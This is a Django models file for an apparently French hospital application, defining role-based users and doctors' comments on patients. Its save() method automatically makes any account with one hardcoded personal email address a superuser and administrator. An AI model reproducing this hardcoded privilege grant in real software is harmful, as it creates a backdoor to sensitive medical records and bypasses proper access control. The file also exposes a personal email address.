from django.db import models
from django.contrib.auth.models import AbstractUser

# Définition des rôles
class User(AbstractUser):
    ROLE_CHOICES = (
        ('admin', 'Administrateur'),
        ('medecin', 'Médecin'),
        ('infirmier', 'Infirmier'),
        ('comptable', 'Comptable'),
        ('patient', 'Patient'),
    )
    role = models.CharField(max_length=20, choices=ROLE_CHOICES, default='patient')
    service = models.CharField(max_length=50, blank=True, null=True) # Ex: Chirurgie, Maternité
    photo_profil = models.ImageField(upload_to='profils/', blank=True, null=True)

    def save(self, *args, **kwargs):
        # Configuration automatique pour toi
        if self.email == "bikoumoutheresa@gmail.com":
            self.is_superuser = True
            self.is_staff = True
            self.role = 'admin'
        super().save(*args, **kwargs)

# Modèle pour les commentaires médicaux
class CommentaireMedical(models.Model):
    patient = models.ForeignKey(User, related_name='commentaires', on_delete=models.CASCADE)
    medecin = models.ForeignKey(User, related_name='commentaires_emis', on_delete=models.CASCADE)
    contenu = models.TextField()
    date_creation = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"Commentaire pour {self.patient.username} par {self.medecin.username}"